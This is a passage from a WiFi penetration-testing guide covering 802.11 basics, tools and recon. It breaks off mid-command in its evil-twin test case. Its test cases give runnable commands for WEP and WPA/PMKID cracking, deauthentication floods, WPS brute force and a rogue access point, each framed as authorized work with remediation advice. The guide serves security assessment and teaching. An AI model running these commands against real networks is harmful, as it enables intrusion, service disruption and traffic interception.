# 🛡️ WiFi Penetration Testing — Complete End-to-End Reference Guide

> **⚖️ LEGAL DISCLAIMER**
> This guide is intended **strictly for authorized security professionals**, ethical hackers, students in controlled lab environments, and network administrators testing their own infrastructure. All techniques described here **require explicit written authorization** from the network owner before execution. Unauthorized access to computer networks is a **criminal offense** under the Computer Fraud and Abuse Act (CFAA, USA), the Computer Misuse Act (UK), the IT Act 2000 (India), and equivalent laws globally. The authors assume no liability for misuse. **Always get written permission. Always.**

---

## 📑 Table of Contents

1. [Understanding WiFi — Foundations](#1-understanding-wifi--foundations)
2. [The Legal & Ethical Framework](#2-the-legal--ethical-framework)
3. [Penetration Testing Methodology](#3-penetration-testing-methodology)
4. [Hardware Tools & Adapters](#4-hardware-tools--adapters)
5. [Operating System & Lab Setup](#5-operating-system--lab-setup)
6. [Software Tools Arsenal](#6-software-tools-arsenal)
7. [Phase 1 — Reconnaissance & Enumeration](#7-phase-1--reconnaissance--enumeration)
8. [Phase 2 — Scanning & Fingerprinting](#8-phase-2--scanning--fingerprinting)
9. [Phase 3 — Vulnerability Analysis](#9-phase-3--vulnerability-analysis)
10. [Phase 4 — Exploitation (Test Cases)](#10-phase-4--exploitation-test-cases)
    - [WEP Cracking](#tc-01-wep-cracking)
    - [WPA/WPA2 4-Way Handshake Capture](#tc-02-wpawpa2-4-way-handshake-capture--crack)
    - [PMKID Attack (Clientless)](#tc-03-pmkid-attack-clientless)
    - [WPS PIN Brute Force (Reaver/Bully)](#tc-04-wps-pin-brute-force)
    - [WPS Pixie Dust Attack](#tc-05-wps-pixie-dust-attack)
    - [Evil Twin / Rogue AP](#tc-06-evil-twin--rogue-access-point)
    - [Captive Portal Phishing](#tc-07-captive-portal-phishing-attack)
    - [Deauthentication / DoS Attack](#tc-08-deauthentication--dos-attack)
    - [WPA2-Enterprise (RADIUS) Attack](#tc-09-wpa2-enterprise-radius-attack)
    - [PMKID / KRACK Attack](#tc-10-krack-attack)
    - [PMFP / Management Frame Injection](#tc-11-management-frame-injection-mdk4)
    - [MAC Address Spoofing / Bypass](#tc-12-mac-address-spoofing--filtering-bypass)
    - [Hidden SSID Discovery](#tc-13-hidden-ssid-discovery)
    - [Client-Side / Probe Request Attacks](#tc-14-client-side--probe-request-attacks)
    - [WPA3-SAE Downgrade Attack](#tc-15-wpa3-sae-dragonblood-downgrade)
    - [Neighbor AP Spoofing / KARMA Attack](#tc-16-karma-attack)
    - [Password Cracking (Hashcat / JtR)](#tc-17-offline-password-cracking-hashcat)
    - [Post-Exploitation — Lateral Movement](#tc-18-post-exploitation--lateral-movement)
11. [Advanced Techniques & Tools](#11-advanced-techniques--tools)
12. [Automated Frameworks](#12-automated-frameworks)
13. [Reporting & Remediation](#13-reporting--remediation)
14. [Compliance Standards](#14-compliance-standards)
15. [Recommended Learning Resources](#15-recommended-learning-resources)
16. [Quick Command Reference Cheatsheet](#16-quick-command-reference-cheatsheet)

---

## 1. Understanding WiFi — Foundations

### 1.1 What is WiFi (802.11)?

WiFi is a family of wireless networking protocols based on the **IEEE 802.11** standard operating over radio frequencies (RF). It allows devices to communicate wirelessly through access points (APs) that bridge wireless clients to a wired network.

### 1.2 IEEE 802.11 Standard Variants

| Standard | Frequency | Max Speed | Notes |
|----------|-----------|-----------|-------|
| 802.11b | 2.4 GHz | 11 Mbps | Legacy, largely obsolete |
| 802.11g | 2.4 GHz | 54 Mbps | Common legacy devices |
| 802.11n (WiFi 4) | 2.4 / 5 GHz | 600 Mbps | MIMO introduced |
| 802.11ac (WiFi 5) | 5 GHz | 3.5 Gbps | MU-MIMO, beamforming |
| 802.11ax (WiFi 6/6E) | 2.4 / 5 / 6 GHz | 9.6 Gbps | OFDMA, WPA3 native |
| 802.11be (WiFi 7) | 2.4 / 5 / 6 GHz | 46 Gbps | MLO, emerging |

### 1.3 Key Concepts for Pentesters

- **SSID (Service Set Identifier):** The name of the wireless network broadcast by the AP.
- **BSSID:** The MAC address of the access point radio interface.
- **Channel:** A frequency slot within the 2.4 GHz or 5 GHz band.
- **Beacon Frame:** Periodic broadcast frames APs send to announce their presence.
- **Probe Request/Response:** Client-initiated frames to discover known networks.
- **Association / Authentication Frame:** Handshake frames used when a client connects.
- **4-Way Handshake (PTK/GTK):** The WPA/WPA2 authentication exchange used to derive encryption keys.
- **PMKID:** Pairwise Master Key Identifier — a hash computed from the PMK, AP MAC, client MAC, and SSID; can be captured from a single beacon frame without client interaction.
- **Monitor Mode:** NIC mode that captures ALL 802.11 frames, not just those destined for the device.
- **Packet Injection:** The ability to craft and transmit arbitrary 802.11 frames.
- **WPS (WiFi Protected Setup):** A simplified pairing method using an 8-digit PIN — inherently vulnerable.

### 1.4 WiFi Security Protocols Timeline

| Protocol | Year | Status | Vulnerability |
|----------|------|--------|---------------|
| WEP | 1997 | **BROKEN** | RC4 key reuse; crackable in minutes |
| WPA (TKIP) | 2003 | **DEPRECATED** | Vulnerable to TKIP attacks |
| WPA2 (CCMP/AES) | 2004 | **Current Standard** | 4-way handshake capture, KRACK |
| WPA3 (SAE) | 2018 | **Modern Standard** | Dragonblood side-channel (patched) |
| WPA3 Enterprise | 2020 | **Enterprise Use** | Mis-config in RADIUS/EAP |

### 1.5 The 802.11 Frame Structure

```
[ MAC Header ] [ Frame Body ] [ FCS ]
  - Frame Control
  - Duration/ID
  - Address 1 (Destination)
  - Address 2 (Source)
  - Address 3 (BSSID)
  - Sequence Control
  - Address 4 (optional)
```

Understanding frame types is critical:
- **Management Frames:** Beacon, Probe, Auth, Assoc, Deauth, Disassoc
- **Control Frames:** ACK, RTS, CTS, Block ACK
- **Data Frames:** Actual payload carrying encrypted/unencrypted data

### 1.6 The 4-Way Handshake (WPA2 Deep Dive)

The 4-Way Handshake derives the **PTK (Pairwise Transient Key)** used to encrypt unicast traffic:

```
Client ←──── AP  :  Message 1 — ANonce (AP's random nonce)
Client ────→ AP  :  Message 2 — SNonce + MIC (Client's nonce + integrity check)
Client ←──── AP  :  Message 3 — GTK encrypted + MIC
Client ────→ AP  :  Message 4 — Acknowledgment

PTK = PRF(PMK, ANonce, SNonce, AP_MAC, STA_MAC)
PMK = PBKDF2-HMAC-SHA1(passphrase, SSID, 4096, 256)
```

Capturing Messages 1+2 (or 2+3) is sufficient for offline cracking because the MIC in Message 2 can be verified against a dictionary of passphrases.

---

## 2. The Legal & Ethical Framework

### 2.1 Written Authorization (Scope of Work)

Before any wireless assessment, obtain a signed **Rules of Engagement (RoE)** document specifying:
- Target networks (SSID, BSSID, IP ranges)
- Physical locations in scope
- Testing windows (time-boxed windows)
- Out-of-scope systems
- Emergency contact for halting the test
- Authorized tester identities

### 2.2 Relevant Laws (Non-Exhaustive)

| Country | Law | Max Penalty |
|---------|-----|-------------|
| USA | CFAA (18 U.S.C. § 1030) | 10–20 years |
| UK | Computer Misuse Act 1990 | Up to 10 years |
| India | IT Act 2000 § 43, 66 | Up to 3 years + fine |
| EU | Directive 2013/40/EU | Varies by member state |
| Australia | Cybercrime Act 2001 | Up to 10 years |

### 2.3 Ethical Principles

- Only test what you are authorized to test — even overlapping SSIDs from neighbors are out of scope.
- Immediately stop testing if unintended disruption is detected.
- Handle all captured credentials and personal data according to data protection laws (GDPR, etc.).
- Destroy sensitive captures (handshakes, passwords) after the engagement.
- Do not exploit findings for personal gain.

---

## 3. Penetration Testing Methodology

### 3.1 Industry Frameworks

- **PTES (Penetration Testing Execution Standard):** Pre-engagement → Intelligence Gathering → Threat Modeling → Vulnerability Research → Exploitation → Post-Exploitation → Reporting.
- **NIST SP 800-115:** Technical Guide to Information Security Testing and Assessment.
- **OWASP Testing Guide:** Wireless security section covers 802.11 assessments.
- **SANS GAWN Curriculum:** Gold standard for wireless pentesting methodology.

### 3.2 Wireless Pentest Phases

```
Phase 0: Pre-Engagement & Authorization
      ↓
Phase 1: Passive Reconnaissance (Wardriving, Stumbling)
      ↓
Phase 2: Active Enumeration (Channel Lock, Client Discovery)
      ↓
Phase 3: Vulnerability Analysis (Protocol Weakness Mapping)
      ↓
Phase 4: Exploitation (Attack Execution per Test Cases)
      ↓
Phase 5: Post-Exploitation (Lateral Movement, Persistence)
      ↓
Phase 6: Reporting & Remediation Guidance
      ↓
Phase 7: Re-Testing / Verification
```

### 3.3 Engagement Types

| Type | Description |
|------|-------------|
| **Black Box** | No prior knowledge of the target environment |
| **Grey Box** | Partial knowledge (e.g., SSID list, floor plan) |
| **White Box** | Full knowledge (credentials, configs, network diagrams) |
| **Red Team** | Full simulation including physical access, social engineering |
| **Compliance Test** | Specifically targeting PCI DSS 11.3, HIPAA requirements |

---

## 4. Hardware Tools & Adapters

### 4.1 Why Standard NICs Fail

Consumer WiFi adapters are designed to connect to networks, NOT to observe them. For pentesting, you need hardware that supports:
1. **Monitor Mode** — Capture all 802.11 frames from all networks
2. **Packet Injection** — Craft and inject arbitrary frames (needed for deauth, handshake forcing)
3. **Dual-Band Support** — Both 2.4 GHz and 5 GHz
4. **Driver Support** — Linux kernel drivers for Kali/Parrot OS

### 4.2 Recommended USB WiFi Adapters (2025)

#### Tier 1 — Professional Grade

| Adapter | Chipset | Bands | Monitor | Injection | Notes |
|---------|---------|-------|---------|-----------|-------|
| **Alfa AWUS036ACHM** | MT7612U (MediaTek) | 2.4 + 5 GHz | ✅ | ✅ | Best 2025 overall; in-kernel Linux driver, no custom driver needed |
| **Alfa AWUS036ACH** | RTL8812AU (Realtek) | 2.4 + 5 GHz | ✅ | ✅ | Industry workhorse; requires `rtl88xxau-dkms` driver |
| **Alfa AWUS036AXML** | MT7921AU (MediaTek) | 2.4 + 5 + 6 GHz | ✅ | ✅ | Plug-and-play on Kali; WiFi 6E support; best future-proofing |
| **Alfa AWUS036ACM** | MT7612U | 2.4 + 5 GHz | ✅ | ✅ | Stable, great range, no driver headaches |

#### Tier 2 — Good Value

| Adapter | Chipset | Bands | Notes |
|---------|---------|-------|-------|
| **Alfa AWUS036NHA** | AR9271 (Atheros) | 2.4 GHz only | Classic choice; rock-solid 2.4 GHz; plug-and-play |
| **TP-Link TL-WN722N v1** | AR9271 | 2.4 GHz only | Only v1 has AR9271; v2/v3 use RTL8188EUS (weaker) |
| **Panda PAU09** | RT5372 (Ralink) | 2.4 + 5 GHz | Good dual-band on budget |
| **Panda PAU0B** | RT5572 | 2.4 + 5 GHz | Kali compatible, compact |

#### Driver Installation (AWUS036ACH)

```bash
# Install on Kali Linux
sudo apt update
sudo apt install -y linux-headers-$(uname -r) realtek-rtl88xxau-dkms
sudo modprobe 88XXau

# Verify adapter detected
ip link show
# or
iwconfig
```

### 4.3 Speciality Hardware

| Device | Purpose | Cost Range |
|--------|---------|------------|
| **WiFi Pineapple (Hak5 Mark VII)** | All-in-one rogue AP platform; Evil Twin, KARMA, recon | ~$100–$150 |
| **WiFi Pineapple TETRA** | Dual-radio enterprise-grade rogue AP | ~$200 |
| **HackRF One** | Software Defined Radio; covers 1 MHz–6 GHz; LoRa, RFID, sub-GHz | ~$300 |
| **RTL-SDR v3** | Budget SDR dongle; 500 kHz–1.75 GHz | ~$25–$30 |
| **Ubertooth One** | Bluetooth 2.4 GHz sniffer and injector | ~$119 |
| **Raspberry Pi 4 + Kali** | Portable headless pentest dropbox | ~$75–$120 |
| **LAN Turtle (Hak5)** | In-line network implant for remote access | ~$55 |
| **Directional Yagi Antenna** | Long-range signal capture (up to 1+ miles) | ~$20–$50 |
| **9 dBi Omni Antenna (RP-SMA)** | AP signal boost for extended range testing | ~$15–$25 |
| **CC2531 USB Dongle** | ZigBee sniffer (IoT protocols) | ~$5–$10 |
| **Texas Instruments CC2540** | BLE sniffer | ~$15 |
| **Proxmark3** | RFID/NFC security testing | ~$300 |

### 4.4 Laptop / Compute Requirements

- **OS:** Kali Linux (rolling), Parrot OS (Security Edition), or BlackArch
- **RAM:** 8 GB minimum; 16 GB recommended for VM setups
- **CPU:** For Hashcat GPU cracking, an Nvidia GTX 1060+ or AMD RX 580+ is recommended
- **GPU:** CUDA/OpenCL compatible for accelerated hash cracking
- **USB:** USB 3.0 port for full adapter throughput
- **Antenna Port:** RP-SMA for external antenna replacement

---

## 5. Operating System & Lab Setup

### 5.1 Kali Linux Setup

```bash
# Full system update
sudo apt update && sudo apt full-upgrade -y

# Install wireless tools suite
sudo apt install -y aircrack-ng kismet wireshark reaver bully \
    hcxtools hcxdumptool hashcat john bettercap hostapd \
    hostapd-wpe dnsmasq isc-dhcp-server mdk4 \
    fluxion wifiphisher airgeddon

# Install Wifite2 from GitHub (latest)
git clone https://github.com/derv82/wifite2.git
cd wifite2 && sudo python3 setup.py install

# WEF (Wi-Fi Exploitation Framework)
git clone https://github.com/D3Ext/WEF
cd WEF && sudo bash setup.sh
```

### 5.2 Setting Adapter to Monitor Mode

```bash
# Method 1: airmon-ng (kills interfering processes first)
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# Adapter is now wlan0mon

# Method 2: iw / ip (manual)
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up
sudo iw dev wlan0 set channel 6

# Verify monitor mode
sudo iw dev
iwconfig wlan0mon
```

### 5.3 Verify Packet Injection Support

```bash
sudo aireplay-ng --test wlan0mon
# Output should show "Injection is working!"
```

### 5.4 Lab Environment for Safe Practice

Use these resources to practice legally:
- **Virtual AP with hostapd** on an isolated network segment
- **Hak5 WiFi Pineapple** in isolated lab
- **Metasploitable** or dedicated test router
- **VulnHub wireless challenges**
- **TryHackMe / Hack The Box** WiFi modules (all cloud-hosted, no hardware needed)

---

## 6. Software Tools Arsenal

### 6.1 Core Tools

| Tool | GitHub / Source | Purpose | Kali Built-in |
|------|----------------|---------|---------------|
| **Aircrack-ng** | [aircrack-ng/aircrack-ng](https://github.com/aircrack-ng/aircrack-ng) | Full 802.11 WEP/WPA suite | ✅ |
| **Kismet** | [kismetwireless/kismet](https://github.com/kismetwireless/kismet) | Passive wireless IDS/stumbler | ✅ |
| **Wireshark** | [wireshark/wireshark](https://github.com/wireshark/wireshark) | Deep packet analysis & filtering | ✅ |
| **Bettercap** | [bettercap/bettercap](https://github.com/bettercap/bettercap) | Full network attack framework (ARP, WiFi, BLE, HID) | ✅ |
| **hcxdumptool** | [ZerBea/hcxdumptool](https://github.com/ZerBea/hcxdumptool) | PMKID + handshake capture | ✅ |
| **hcxtools** | [ZerBea/hcxtools](https://github.com/ZerBea/hcxtools) | Convert captures to hashcat format | ✅ |
| **Hashcat** | [hashcat/hashcat](https://github.com/hashcat/hashcat) | GPU-accelerated password cracking | ✅ |
| **John the Ripper** | [openwall/john](https://github.com/openwall/john) | CPU-based password cracker | ✅ |
| **Reaver** | [t6x/reaver-wps-fork-t6x](https://github.com/t6x/reaver-wps-fork-t6x) | WPS PIN brute force | ✅ |
| **Bully** | [aanarchyy/bully](https://github.com/aanarchyy/bully) | WPS brute force (C implementation) | ✅ |
| **PixieWPS** | [wiire-a/pixiewps](https://github.com/wiire-a/pixiewps) | WPS Pixie Dust attack | ✅ |
| **MDK4** | [aircrack-ng/mdk4](https://github.com/aircrack-ng/mdk4) | Management frame injection / DoS | ✅ |

### 6.2 Automated Frameworks

| Tool | GitHub | Description |
|------|--------|-------------|
| **Airgeddon** | [v1s1t0r1sh3r3/airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon) | Multi-use bash framework; menu-driven; WPA/WPS/Evil Twin/Enterprise |
| **Wifite2** | [derv82/wifite2](https://github.com/derv82/wifite2) | Automated attack tool; auto-selects best attack per AP |
| **Fluxion** | [FluxionNetwork/fluxion](https://github.com/FluxionNetwork/fluxion) | Evil Twin + social engineering portal |
| **WifiPumpkin3** | [P0cL4bs/wifipumpkin3](https://github.com/P0cL4bs/wifipumpkin3) | Rogue AP framework with modular attack plugins |
| **Wifiphisher** | [wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) | Automated Evil Twin + credential phishing |
| **EAPHammer** | [s0lst1c3/eaphammer](https://github.com/s0lst1c3/eaphammer) | WPA2-Enterprise / EAP attacks |
| **Hostapd-WPE** | Included in Kali | Wireless Pwnage Edition — fake RADIUS server |
| **WEF** | [D3Ext/WEF](https://github.com/D3Ext/WEF) | WiFi Exploitation Framework (2023–2025) |
| **Pwnagotchi** | [evilsocket/pwnagotchi](https://github.com/evilsocket/pwnagotchi) | AI-based autonomous handshake capture (Raspberry Pi) |
| **SniffAir** | [Tylous/SniffAir](https://github.com/Tylous/SniffAir) | Wireless assessment framework with ML |
| **WiFi Arsenal** | [0x90/wifi-arsenal](https://github.com/0x90/wifi-arsenal) | Curated collection of WiFi attack tools |

### 6.3 Enterprise & Advanced Tools

| Tool | Purpose |
|------|---------|
| **ASLEAP** | Crack LEAP/PPTP MS-CHAPv2 hashes from EAP captures |
| **FreeRADIUS-WPE** | Hostile RADIUS server for credential harvesting |
| **HOSTAPD-MANA** | Advanced hostile AP with KARMA/MANA attacks |
| **Scapy (Python)** | Craft custom 802.11 frames programmatically |
| **Pyrit** | Cloud-distributed WPA pre-computation (uses GPU) |
| **CoWPAtty** | WPA-PSK dictionary attack with pre-computed hashes |
| **WiFuzzle** | 802.11 protocol fuzzer |
| **Wacker** | WPA3-SAE brute force (Dragonblood attack) |

---

## 7. Phase 1 — Reconnaissance & Enumeration

### 7.1 Passive Reconnaissance (Wardriving)

Passive recon involves **only listening** — no frames are transmitted.

```bash
# Start monitor mode
sudo airmon-ng start wlan0

# Passive scan — capture all APs and clients
sudo airodump-ng wlan0mon

# Lock on specific channel (e.g., channel 6)
sudo airodump-ng wlan0mon --channel 6

# Save output to file
sudo airodump-ng wlan0mon -w capture_output --output-format csv,pcap
```

**What to document from airodump-ng output:**
- BSSID (AP MAC address)
- PWR (Signal strength — lower negative = stronger)
- Beacons (number of beacon frames)
- #Data (number of data packets)
- CH (channel)
- MB (max transmission rate)
- ENC (encryption type: OPN, WEP, WPA, WPA2, WPA3)
- CIPHER (CCMP, TKIP, WRAP)
- AUTH (PSK, MGT = Enterprise, SAE)
- ESSID (network name)
- Stations (connected clients — STATION column)

### 7.2 Kismet for Comprehensive Passive Mapping

```bash
sudo kismet -c wlan0mon

# Access the web UI at http://localhost:2501
# Kismet logs to ~/.kismet/ directory

# CLI output example
kismet --no-ncurses -c wlan0mon --log-types wiglecsv,pcapng,kismet
```

### 7.3 Active Scanning with Bettercap

```bash
sudo bettercap -iface wlan0mon

# Inside bettercap interactive shell:
wifi.recon on
wifi.show
wifi.recon.channel 6
ticker on, wifi.show
```

### 7.4 Wardriving with WiGLE / NetStumbler Approach

```bash
# Using GPSd + Kismet for wardriving with GPS coordinates
sudo gpsd /dev/ttyUSB0 -F /var/run/gpsd.sock
sudo kismet -c wlan0mon --gps-reconnect true
```

---

## 8. Phase 2 — Scanning & Fingerprinting

### 8.1 AP Fingerprinting

```bash
# Lock on specific BSSID and channel
sudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF --channel 6 -w target

# Identify connected clients
# STATION column in airodump-ng output shows client MAC addresses
```

### 8.2 WPS Detection

```bash
# Scan for WPS-enabled APs
sudo wash -i wlan0mon

# Output columns:
# BSSID | Ch | dBm | WPS | Lck | Vendor | ESSID
# WPS version, WPS locked status, vendor info
```

### 8.3 ESSID Enumeration

```bash
# Identify hidden SSIDs by waiting for probe responses
sudo airodump-ng wlan0mon --channel 6

# Or force probe by sending deauth to clients
sudo aireplay-ng --deauth 2 -a AA:BB:CC:DD:EE:FF wlan0mon
# Clients will re-probe revealing the hidden SSID
```

### 8.4 Signal Strength Mapping

```bash
# Watch signal in real time
watch -n 1 'sudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF --channel 6'

# Wireshark filter for signal strength (radiotap header)
# Filter: wlan.fc.type_subtype == 0x08 (beacon frames)
```

---

## 9. Phase 3 — Vulnerability Analysis

### 9.1 Vulnerability Categories

| Category | Vulnerability | Severity |
|----------|--------------|----------|
| Encryption | WEP in use | Critical |
| Encryption | WPA/TKIP (deprecated) | High |
| Authentication | WPS enabled and not locked | High |
| Authentication | Default/weak PSK | High |
| Authentication | No certificate validation in WPA2-Enterprise | High |
| Configuration | Open networks with sensitive data | Critical |
| Configuration | Hidden SSID (obscurity only) | Low |
| Configuration | MAC filtering only | Low |
| Infrastructure | Rogue AP / Evil Twin susceptibility | High |
| Infrastructure | PMKID capturable | Medium |
| Protocol | Management frames unprotected (no PMF) | Medium |
| Protocol | WPA3 Dragonblood downgrade susceptibility | Medium |
| Client-side | Probe request leakage | Medium |

### 9.2 Automated Vulnerability Assessment

```bash
# Wifite2 auto-scans and attempts best attack
sudo wifite --wpa --wps --kill

# Airgeddon menu-driven assessment
sudo bash airgeddon.sh

# WEF framework
sudo bash wef.sh
```

---

## 10. Phase 4 — Exploitation (Test Cases)

> ⚠️ All test cases below must only be executed on **networks you own or have explicit written authorization to test.**

---

### TC-01: WEP Cracking

**Description:** WEP (Wired Equivalent Privacy) uses a flawed RC4 cipher with static IVs. Even with a single client, 80,000–100,000 IVs are sufficient to recover the key using statistical analysis. Without clients, the ChopChop or Fragmentation attack can generate IVs artificially.

**Preconditions:** Target AP uses WEP encryption.

**Tools:** Aircrack-ng suite

**Steps:**

```bash
# Step 1: Enable monitor mode
sudo airmon-ng start wlan0

# Step 2: Identify WEP target
sudo airodump-ng wlan0mon
# Note: ENC column shows "WEP"

# Step 3: Lock on target AP
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w wep_capture wlan0mon

# Step 4: Fake authentication (associate with AP)
sudo aireplay-ng --fakeauth 30 -e "TargetSSID" -a AA:BB:CC:DD:EE:FF wlan0mon

# Step 5: ARP Replay (accelerate IV collection)
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h <your_mac> wlan0mon

# Step 6: Crack the key when sufficient IVs collected
sudo aircrack-ng wep_capture*.cap
# Typically need 80,000+ IVs; key recovered in seconds
```

**Alternative (no clients):**
```bash
# Fragmentation attack to generate keystream
sudo aireplay-ng --fragment -b AA:BB:CC:DD:EE:FF wlan0mon
sudo packetforge-ng --arp -a AA:BB:CC:DD:EE:FF -h <your_mac> -k 255.255.255.255 -l 255.255.255.255 -y fragment*.xor -w forged.cap
sudo aireplay-ng --interactive -r forged.cap wlan0mon
```

**Expected Result:** WEP key recovered in plaintext (e.g., `KEY FOUND! [ AB:CD:EF:12:34 ]`)

**Remediation:** Immediately disable WEP. Upgrade to WPA2 with AES/CCMP or WPA3.

---

### TC-02: WPA/WPA2 4-Way Handshake Capture & Crack

**Description:** Capture the 4-way handshake when a client authenticates and perform offline dictionary/brute-force attack. The MIC in the handshake can be verified against candidate passwords without communicating with the AP.

**Preconditions:** Target uses WPA or WPA2-PSK. At least one client connected (or force reconnection with deauth).

**Tools:** airodump-ng, aireplay-ng, aircrack-ng / hashcat

**Steps:**

```bash
# Step 1: Monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: Capture target traffic
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 \
    -w handshake_capture wlan0mon
# Watch for "WPA handshake: AA:BB:CC:DD:EE:FF" in top-right

# Step 3: Force reconnection (deauthentication attack)
# Open a new terminal
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF \
    -c CLIENT_MAC wlan0mon
# -c specifies a specific client; omit for broadcast deauth

# Step 4: Verify handshake captured
sudo aircrack-ng handshake_capture*.cap
# Should show "1 handshake" in output

# Step 5a: Crack with aircrack-ng (CPU, dictionary)
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt \
    -b AA:BB:CC:DD:EE:FF handshake_capture*.cap

# Step 5b: Convert and crack with hashcat (GPU, much faster)
# Convert .cap to .hc22000 format
hcxpcapngtool -o handshake.hc22000 handshake_capture*.cap

# Dictionary attack
hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# Brute force (up to 8 chars)
hashcat -m 22000 handshake.hc22000 -a 3 ?a?a?a?a?a?a?a?a

# Mask attack (if you know password pattern, e.g., word + 4 digits)
hashcat -m 22000 handshake.hc22000 -a 6 wordlist.txt ?d?d?d?d
```

**Expected Result:** Password recovered in plaintext (e.g., `KEY FOUND! password123`)

**Remediation:** Use strong random passphrase (20+ characters). Enable WPA3-SAE where possible. Enable PMF (Protected Management Frames / MFP) to block deauthentication attacks.

---

### TC-03: PMKID Attack (Clientless)

**Description:** The PMKID (Pairwise Master Key Identifier) is sent in the first EAPOL frame during association. Unlike the 4-way handshake, this requires **no client present** — the tester can request it directly from the AP. The PMKID is: `PMKID = HMAC-SHA1-128(PMK, "PMK Name" || BSSID || STMAC)`

**Preconditions:** AP supports RSN (WPA2). Most modern routers are vulnerable.

**Tools:** hcxdumptool, hcxtools, hashcat

**Steps:**

```bash
# Step 1: Capture PMKID (targets ALL nearby APs)
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng \
    --enable_status=1

# Capture PMKID for a specific AP only (recommended — reduce noise)
# Create a filter file with target BSSID (no colons)
echo "AABBCCDDEEFF" > target.txt
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng \
    --filterlist_ap=target.txt --filtermode=2 \
    --enable_status=3

# Step 2: Convert to hashcat format
hcxpcapngtool -o pmkid_hashes.hc22000 pmkid_capture.pcapng
# Also generates useful metadata:
hcxpcapngtool -o pmkid_hashes.hc22000 --csv pmkid_info.csv pmkid_capture.pcapng

# Step 3: Verify hashes were extracted
cat pmkid_hashes.hc22000 | head -5
# Format: hash*bssid*clientmac*essid

# Step 4: Crack with hashcat
hashcat -m 22000 pmkid_hashes.hc22000 \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/dive.rule \
    --session=pmkid-crack

# Show cracked results
hashcat -m 22000 pmkid_hashes.hc22000 --show
```

**Expected Result:** PMK recovered → passphrase extracted

**Why This Is Significant:** No client interaction required. APs broadcast PMKID in response to any association request, making this the preferred WPA2 attack vector for modern assessments.

**Remediation:** Use WPA3-SAE (SAE does not expose PMKID in the same way). Use strong random passphrases. Enable PMF.

---

### TC-04: WPS PIN Brute Force

**Description:** WPS uses an 8-digit PIN split into two halves (4+4 digits). The router validates each half independently, reducing the search space from 10^8 to 11,000 combinations. An attacker can brute-force all valid PINs.

**Preconditions:** AP has WPS enabled and not locked (Wash output shows `Lck: No`).

**Tools:** Reaver, Bully, wash

**Steps:**

```bash
# Step 1: Identify WPS-enabled, unlocked APs
sudo wash -i wlan0mon --scan
# Look for WPS column = "2.0" and Lck = "No"

# Step 2: Reaver brute force
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF \
    -vv \
    -L \        # Ignore locked state
    -N \        # No associated MFP
    -d 2 \      # Delay between attempts (seconds)
    -r 3:15     # 3 attempts then sleep 15 seconds

# Step 3: Bully alternative (more robust C implementation)
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF \
    -d -v 3 \
    -c 6

# Step 4: Resume interrupted session (Reaver saves state)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv \
    -r 3:15 -L
```

**Expected Result:** WPS PIN recovered, then WPA/WPA2 passphrase automatically extracted from AP.

**Remediation:** Disable WPS entirely. If WPS is required, enable WPS lockout (lock after 3–5 failed attempts). Update router firmware.

---

### TC-05: WPS Pixie Dust Attack

**Description:** Many router chipsets (Ralink, Realtek, Broadcom) generate weak random nonces (E-S1, E-S2) during WPS exchange. PixieWPS exploits this by computing the PIN offline using predictable nonce values. This attack can recover the PIN in **seconds to minutes** instead of hours.

**Preconditions:** AP uses vulnerable chipset (Ralink, Realtek, some Broadcom).

**Tools:** Reaver, PixieWPS, Airgeddon (recommended for automation)

**Steps:**

```bash
# Step 1: Attempt Pixie Dust via Reaver
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF \
    -vv -K 1   # -K 1 enables PixieDust

# Step 2: Via Bully
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF \
    -d -v 3 --pixie

# Step 3: Automated via Airgeddon
sudo bash airgeddon.sh
# Navigate: WPS attacks → PixieDust attack
```

**Expected Result:** WPS PIN and WPA passphrase recovered in under 60 seconds on vulnerable routers.

**Remediation:** Same as TC-04. Update router firmware; disable WPS.

---

### TC-06: Evil Twin / Rogue Access Point

**Description:** Create a malicious access point with the same SSID (and optionally BSSID) as the legitimate AP. Broadcast it at higher power to attract clients. Intercept all traffic (MitM), harvest credentials, or inject malicious content.

**Preconditions:** Knowledge of target SSID and channel. Sufficient transmit power to out-signal the real AP.

**Tools:** hostapd, dnsmasq, iptables, Bettercap, Wifiphisher, Fluxion, Airgeddon

**Steps (Manual Method):**

```bash
# Step 1: Create hostapd config for fake AP
cat > /tmp/evil_twin.conf << EOF
interface=wlan0
driver=nl80211
ssid=TargetNetwork
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
EOF

# Step 2: Start fake AP
sudo hostapd /tmp/evil_twin.conf &

# Step 3: Configure DHCP server
cat > /tmp/dnsmasq.conf << EOF
interface=wlan0
dhcp-range=192.168.1.50,192.168.1.150,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
EOF
sudo ifconfig wlan0 192.168.1.1 netmask 255.255.255.0
sudo dnsmasq -C /tmp/dnsmasq.conf -d &

# Step 4: Enable IP forwarding and NAT
sudo sysctl net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Step 5: Deauthenticate clients from real AP
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
# Continuous deauth — clients will connect to stronger evil twin
```

**Automated Method (Wifiphisher):**

```bash
sudo wifiphisher --essid "TargetNetwork" \
    -phishing-pages firmware-upgrade \
    -kB
